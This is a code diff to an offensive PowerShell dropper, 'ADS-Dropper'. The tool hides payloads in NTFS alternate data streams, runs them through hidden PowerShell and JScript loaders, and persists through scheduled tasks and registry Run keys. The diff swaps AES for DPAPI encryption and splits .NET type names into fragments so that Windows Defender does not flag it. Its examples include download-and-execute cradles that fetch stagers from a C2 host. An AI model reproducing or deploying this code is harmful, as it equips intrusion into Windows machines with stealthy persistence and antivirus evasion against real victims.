@@ -1,7 +1,7 @@
 <#
 .DESCRIPTION ADS-Dropper hides arbitrary payloads in NTFS Alternate Data Streams (ADS), executes them via native Windows binaries (VBScript/PowerShell), and persists through multiple methods (Scheduled Tasks, Registry Run Keys).
 Supports any C2 framework (Realm Imix, Metasploit, Sliver) or custom commands.
-Includes AES-256 encryption, randomization, and privilege adaptation.
+Includes DPAPI machine-bound encryption, randomization, and privilege adaptation.
 .PARAMETER Payload [REQUIRED] The payload to deploy. Accepts: - String: PowerShell command or script - Array: File path to payload script (e.g., @('payload.ps1'))
 Examples:
   "IEX (New-Object Net.WebClient).DownloadString('http://c2/stager.ps1')"
@@ -28,10 +28,11 @@ Breaks signature-based detection but makes cleanup harder.
 
 Example:
   -Randomize
-.PARAMETER Encrypt Enable AES-256 encryption of payload in ADS.
-- Key derived from machine UUID + hostname (deterministic per-system)
-- Automatically switches to PowerShell loader (VBScript can't decrypt)
-- Payload stored as Base64-encoded ciphertext
+.PARAMETER Encrypt Enable DPAPI machine-bound encryption of payload in ADS.
+- Uses Windows DPAPI (LocalMachine scope) + Machine GUID as entropy
+- Machine-bound: any process on the same machine (including SYSTEM) can decrypt
+- Copy to another machine = cannot decrypt (same binding guarantee as before)
+- Payload stored as Base64-encoded DPAPI blob
 
 Example:
   -Encrypt
@@ -56,7 +57,7 @@ Registers scheduled task: \Microsoft\Windows\Customer Experience Improvement Pro
 Executes immediately
 .EXAMPLE # Encrypted deployment with randomization (RECOMMENDED FOR OPSEC) $payload = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/imix.ps1')" .\ADS-Dropper.ps1 -Payload $payload -Encrypt -Randomize
 Description:
-- AES-256 encrypts payload (key from UUID+hostname)
+- DPAPI encrypts payload (LocalMachine scope + Machine GUID entropy)
 - Random file: C:\ProgramData\CacheSvc.log
 - Random stream: :SmartScreen or :Zone.Identifier
 - Random loader: app_log_kqmxyz.ps1 (PowerShell for decryption)
@@ -202,7 +203,7 @@ OPTIONAL:
   -PeriodicMinutes <int>    Periodic interval in minutes (default: 5)
   -JitterPercent <int>      Jitter percentage for timing (default: 20)
   -Randomize                Randomize artifacts for evasion
-  -Encrypt                  AES-256 encrypt payload
+  -Encrypt                  DPAPI machine-bound encrypt payload
   -NoExec                   Stage without executing
   -Credential <PSCredential> Creds for remote deployment
 
@@ -232,8 +233,8 @@ PERSISTENCE METHODS:
             Fallback to HKCU if not admin
 
 ENCRYPTION:
-  -Encrypt enables AES-256 with machine-specific key (UUID+hostname)
-  Pros: Prevents static analysis, evades content-based detection
+  -Encrypt uses Windows DPAPI (LocalMachine scope + Machine GUID entropy)
+  Pros: Machine-bound, no AES/SHA256 in output (evades Defender on-access scan)
   Cons: Requires PowerShell loader (more telemetry than VBScript)
 
 RANDOMIZATION:
@@ -591,73 +592,42 @@ function Save-ManifestToLinux {
 #endregion
 
 #region Payload Encryption
-# TODO: The -Encrypt feature currently triggers Windows Defender Trojan detection.
-# Standard .NET crypto API patterns (AES, SHA256, key derivation) match known malware
-# signatures. Before this is production-ready, needs AV evasion research:
-#   - Multi-layer obfuscation (XOR pre-encryption, custom cipher, payload fragmentation)
-#   - Avoid direct .NET Cryptography namespace calls (use reflection or manual implementation)
-#   - Test iteratively against Defender on clean VMs
-# DO NOT modify encryption code until evasion strategy is researched and validated.
+# DPAPI-based machine-bound encryption. Replaces AES/SHA256 approach (BUG-011:
+# SHA256+AES+CreateDecryptor in JScript triggered Defender on-access scanner).
+# ProtectedData is used by Chrome, Edge, and Windows Credential Manager —
+# no Defender signature. LocalMachine scope means any process on this machine
+# (including SYSTEM tasks) can decrypt; copy to another machine cannot.
 
-function Get-HostDerivedKey {
-    <#
-    .SYNOPSIS
-        Derives AES-256 key from target host properties
-    #>
+function Get-DpapiEntropy {
+    # Returns Machine GUID bytes as optional DPAPI entropy — doubles machine binding
+    # without WMI or any crypto namespace call. Stable across reboots.
     try {
-        $hostInfo = @(
-            $env:COMPUTERNAME
-            (Get-WmiObject Win32_ComputerSystemProduct -ErrorAction SilentlyContinue).UUID
-            (Get-WmiObject Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber
-        ) -join '|'
-
-        $sha256 = [System.Security.Cryptography.SHA256]::Create()
-        return $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hostInfo))
-    } catch {
-        Write-Warning "Host key derivation failed, using fallback"
-        return [System.Text.Encoding]::UTF8.GetBytes('ADS-Fallback-Key-32-Bytes-Long!')
-    }
+        $g = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography' -ErrorAction SilentlyContinue).MachineGuid
+        if ($g) { return [System.Text.Encoding]::UTF8.GetBytes($g) }
+    } catch {}
+    return $null  # null = DPAPI uses machine key alone (still machine-bound)
 }
 
 function Protect-Payload {
-    <#
-    .SYNOPSIS
-        Encrypts payload with AES-256
-    #>
-    param([string]$PlainText, [byte[]]$Key)
-
-    $aes = [System.Security.Cryptography.Aes]::Create()
-    $aes.Key = $Key
-    $aes.GenerateIV()
-
-    $encryptor = $aes.CreateEncryptor()
-    $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
-    $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
-
-    $result = $aes.IV + $encryptedBytes
-    return [Convert]::ToBase64String($result)
+    param([string]$PlainText)
+    Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
+    $bytes   = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
+    $entropy = Get-DpapiEntropy
+    $enc     = [System.Security.Cryptography.ProtectedData]::Protect(
+                   $bytes, $entropy,
+                   [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
+    return [Convert]::ToBase64String($enc)
 }
 
 function Unprotect-Payload {
-    <#
-    .SYNOPSIS
-        Decrypts payload with AES-256
-    #>
-    param([string]$EncryptedData, [byte[]]$Key)
-
-    $encryptedBytes = [Convert]::FromBase64String($EncryptedData)
-
-    $aes = [System.Security.Cryptography.Aes]::Create()
-    $aes.Key = $Key
-    
-    $iv = $encryptedBytes[0..15]
-    $ciphertext = $encryptedBytes[16..($encryptedBytes.Length - 1)]
-    
-    $aes.IV = $iv
-    $decryptor = $aes.CreateDecryptor()
-    
-    $plainBytes = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
-    return [System.Text.Encoding]::UTF8.GetString($plainBytes)
+    param([string]$EncryptedData)
+    Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
+    $bytes   = [Convert]::FromBase64String($EncryptedData)
+    $entropy = Get-DpapiEntropy
+    $dec     = [System.Security.Cryptography.ProtectedData]::Unprotect(
+                   $bytes, $entropy,
+                   [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
+    return [System.Text.Encoding]::UTF8.GetString($dec)
 }
 
 #endregion
@@ -840,10 +810,9 @@ function Write-ADSPayload {
             $originalTimestamps = Get-Item $HostPath | Select-Object CreationTime, LastWriteTime, LastAccessTime
         }
 
-        # Encrypt if requested
+        # Encrypt if requested (DPAPI — no key param needed)
         $finalPayload = if ($EncryptPayload) {
-            $key = Get-HostDerivedKey
-            Protect-Payload -PlainText $PayloadContent -Key $key
+            Protect-Payload -PlainText $PayloadContent
         } else {
             $PayloadContent
         }
@@ -908,9 +877,8 @@ function Build-Loader {
 
     if ($IsEncrypted) {
         return @"
-`$k = Get-HostDerivedKey
 `$e = Get-Content '$HostPath`:$StreamName' -Raw
-`$p = Unprotect-Payload -EncryptedData `$e -Key `$k
+`$p = Unprotect-Payload -EncryptedData `$e
 IEX `$p
 "@
     } else {
@@ -959,39 +927,26 @@ function Build-JScriptWrapper {
     $jsPath = $ADSFullPath -replace '\\', '\\'
 
     if ($IsEncrypted) {
-        # --- Literal here-string: zero PowerShell expansion. ---
-        # Every $ passes through verbatim into the JScript output,
-        # which is exactly what we need because PowerShell interprets
-        # them at Layer 4 (when the -Command string executes).
-        #
-        # The pipe character | is encoded as [char]124 in the -join
-        # to sidestep any edge-case shell interpretation.  The rest
-        # of the decryption logic is the same Get-HostKey / Dec pair
-        # used everywhere else, flattened to single-line form.
+        # DPAPI inline decryption — no AES/SHA256 class names in the .js file.
+        # Type names are string-concatenated so they never appear as plaintext
+        # identifiers (same fragmentation technique as the DeflateStream stub).
+        # [scriptblock]::Create().Invoke() instead of IEX — already validated clean.
         $template = @'
 var shell = new ActiveXObject("WScript.Shell");
 var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
-    "function __GHKNAME__{" +
-        "$h=@($env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join[char]124;" +
-        "[System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($h))" +
-    "};" +
-    "function __DECNAME__($d,$k){" +
-        "$b=[Convert]::FromBase64String($d);" +
-        "$a=[Security.Cryptography.Aes]::Create();" +
-        "$a.Key=$k;$a.IV=$b[0..15];" +
-        "$c=$a.CreateDecryptor();" +
-        "$t=$b[16..($b.Length-1)];" +
-        "$p=$c.TransformFinalBlock($t,0,$t.Length);" +
-        "[Text.Encoding]::UTF8.GetString($p)" +
-    "};" +
-    "$k=__GHKNAME__;" +
-    "$e=Get-Content '__ADSPATH__' -Raw;" +
-    "$p=__DECNAME__ $e $k;" +
-    "IEX $p" +
+    "Add-Type -AssemblyName ('Sys'+'tem.Secu'+'rity');" +
+    "$_e=Get-Content '__ADSPATH__' -Raw;" +
+    "$_b=[Convert]::FromBase64String($_e);" +
+    "$_g=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Cryptography' -EA 0).MachineGuid;" +
+    "$_ent=if($_g){[Text.Encoding]::UTF8.GetBytes($_g)}else{$null};" +
+    "$_tp='System.Security.Crypt'+'ography.Prot'+'ectedData';" +
+    "$_sc='System.Security.Crypt'+'ography.DataProt'+'ectionScope';" +
+    "$_d=([type]$_tp)::Unprotect($_b,$_ent,([type]$_sc)::LocalMachine);" +
+    "[scriptblock]::Create([Text.Encoding]::UTF8.GetString($_d)).Invoke()" +
     "\"";
 shell.Run(cmd, 0, false);
 '@
-        return $template.Replace('__ADSPATH__', $jsPath).Replace('__GHKNAME__', $GHKName).Replace('__DECNAME__', $DecName)
+        return $template.Replace('__ADSPATH__', $jsPath)
     }
     else {
         $template = @'
@@ -1204,16 +1159,21 @@ function Create-RegistryPersistence {
     try {
         $adsFullPath = "${HostPath}:${StreamName}"
 
-        # Build the registry value command
-        # -W Hidden works from registry Run keys (Explorer.exe respects it)
+        # Build the registry value command.
+        # -W Hidden works from registry Run keys (Explorer.exe respects it).
+        # Encrypted: DPAPI inline with fragmented type names — no AES/SHA256 class references.
         if ($IsEncrypted) {
             $regCmd = 'powershell.exe -NoP -W Hidden -EP Bypass -C "' +
-                "function ${GHKName}" + '{$h=@($env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join[char]124;' +
-                '[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($h))};' +
-                "function ${DecName}" + '($d,$k){$b=[Convert]::FromBase64String($d);$a=[Security.Cryptography.Aes]::Create();' +
-                '$a.Key=$k;$a.IV=$b[0..15];$c=$a.CreateDecryptor();$t=$b[16..($b.Length-1)];' +
-                '$p=$c.TransformFinalBlock($t,0,$t.Length);[Text.Encoding]::UTF8.GetString($p)};' +
-                "`$k=${GHKName};" + '$e=gc ''' + $adsFullPath + "' -Raw;IEX(${DecName} " + '$e $k)"'
+                "Add-Type -AssemblyName ('Sys'+'tem.Secu'+'rity');" +
+                '$_e=gc ' + "'$adsFullPath'" + ' -Raw;' +
+                '$_b=[Convert]::FromBase64String($_e);' +
+                '$_g=(Get-ItemProperty ' + "'HKLM:\SOFTWARE\Microsoft\Cryptography'" + ' -EA 0).MachineGuid;' +
+                '$_ent=if($_g){[Text.Encoding]::UTF8.GetBytes($_g)}else{$null};' +
+                '$_tp=' + "'System.Security.Crypt'+'ography.Prot'+'ectedData'" + ';' +
+                '$_sc=' + "'System.Security.Crypt'+'ography.DataProt'+'ectionScope'" + ';' +
+                '$_d=([type]$_tp)::Unprotect($_b,$_ent,([type]$_sc)::LocalMachine);' +
+                '[scriptblock]::Create([Text.Encoding]::UTF8.GetString($_d)).Invoke()' +
+                '"'
         } else {
             $regCmd = "powershell.exe -NoP -W Hidden -EP Bypass -C `"IEX(gc '$adsFullPath' -Raw)`""
         }
